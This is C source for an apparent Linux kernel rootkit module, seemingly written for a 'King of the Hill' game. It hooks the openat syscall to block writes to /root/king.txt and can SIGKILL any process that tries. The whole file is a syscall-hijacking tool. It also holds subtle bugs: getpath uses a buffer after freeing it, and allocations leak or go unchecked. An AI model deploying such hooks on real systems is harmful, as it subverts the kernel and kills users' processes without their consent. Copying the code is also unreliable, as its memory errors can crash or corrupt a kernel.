#include "openAt.h"
#include <linux/limits.h>

short closeProcess = 0;

char *getpath(struct task_struct *task, char *filename) {
	char *dir, *buffer;
	struct path pwd, root;

	pwd = task->fs->pwd;
	root = task->fs->root;
	path_get(&pwd);
	path_get(&root);

	buffer = kzalloc(4096, GFP_KERNEL);
	dir = d_path(&pwd, buffer, 4096);

	kfree(buffer);
	strcat(dir, "/");
    strcat(dir, filename);
	return dir;
}

// Not my code, needs rewriting some time :P credit to stack overflow
void respath(char *path)
{
    size_t i, j, k;
    i = 0; k = 0;

    while (path[i] != '\0') {
        if (path[i] == '/' || path[i] == '\\') {
            path[k++] = '/';
            while (path[i] == '/' || path[i] == '\\')
                i++;
        } else path[k++] = path[i++];
    }

    path[k] = '\0';

    i = 0; j = 0; k = 0;

    do {
        if (path[i] == '/' || path[i] == '\0') {
            if ((i - j) == 1 && !strncmp (path + j, ".", 1)) {
                if (k == 0) {
                    if (path[i] == '\0') {
                        path[k++] = '.';
                    } else if (path[i] == '/' && path[i + 1] == '\0') {
                        path[k++] = '.';
                        path[k++] = '/';
                    }
                } else if (k > 1)
                    if (path[i] == '\0') k--;
            } else if ((i - j) == 2 && !strncmp (path + j, "..", 2)) {
                if (k == 0) {
                    path[k++] = '.';
                    path[k++] = '.';

                    if (path[i] == '/') path[k++] = '/';
                } else if (k > 1) {
                    for (j = 1; j < k; j++)
                        if (path[k - j - 1] == '/') break;

                    if (j < k) {
                        if (!strncmp (path + k - j, "..", 2)) {
                            path[k++] = '.';
                            path[k++] = '.';
                        } else k = k - j - 1;

                        if (k == 0 && path[0] == '/') path[k++] = '/';
                        else if (path[i] == '/') path[k++] = '/';
                    } else {
                        if (k == 3 && !strncmp (path, "..", 2)) {
                            path[k++] = '.';
                            path[k++] = '.';

                            if (path[i] == '/') path[k++] = '/';
                        } else if (path[i] == '\0') {
                            k = 0;
                            path[k++] = '.';
                        } else if (path[i] == '/' && path[i + 1] == '\0') {
                            k = 0;
                            path[k++] = '.';
                            path[k++] = '/';
                        } else k = 0;
                    }
                }
            } else {
                memmove (path + k, path + j, i - j);
                k += i - j;
                if (path[i] == '/') path[k++] = '/';
            }

            while (path[i] == '/')
                i++;
            j = i;
        }
        else if (k == 0) {
            while (path[i] == '.' || path[i] == '/')
                j++,i++;
        }
    } while (path[i++] != '\0');
    path[k] = '\0';
}

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long (*ogOpenAt)(struct pt_regs *regs);
asmlinkage long hookOpenAt(struct pt_regs *regs) {
	int dfd = regs->di;
	char __user *filename = (char *) regs->si;
	int flags = regs->dx;
#else
asmlinkage long (*ogOpenAt)(int dfd, const char __user *filename, int flags, umode_t mode);
asmlinkage long hookOpenAt(int dfd, const char __user *filename, int flags, umode_t mode) {
#endif
	char *buffer = kzalloc(4096, GFP_KERNEL);
	char *directory = kzalloc(4096, GFP_KERNEL);
    long ret = 0;
	if (!buffer) return ret;

	if (strncpy_from_user(buffer, filename, 4096) > 0 && dfd == -100 && strstr(buffer, "king.txt")) {
		if ((flags & O_WRONLY) == O_WRONLY || (flags & O_RDWR) == O_RDWR || (flags & O_APPEND) == O_APPEND) {
            directory = (strchr(buffer, (int)'/') - buffer == 0) ? strcpy(directory, buffer) : getpath(current, buffer);
			respath(directory);
			if (strcmp(directory, "/root/king.txt") == 0) ret = -1;
		}
	} 
	
	kfree(buffer);
	
	if ((ret == -1) && (closeProcess == 1)) {
		struct kernel_siginfo info;
		memset(&info, 0, sizeof(struct kernel_siginfo));
		info.si_signo = SIGKILL;
		send_sig_info(SIGKILL, &info, current);
	}
#ifdef PTREGS_SYSCALL_STUBS
	if (ret == 0) ret = ogOpenAt(regs);
#else
	if (ret == 0) ret = ogOpenAt(dfd, filename, flags, mode);
#endif
	return ret;
}
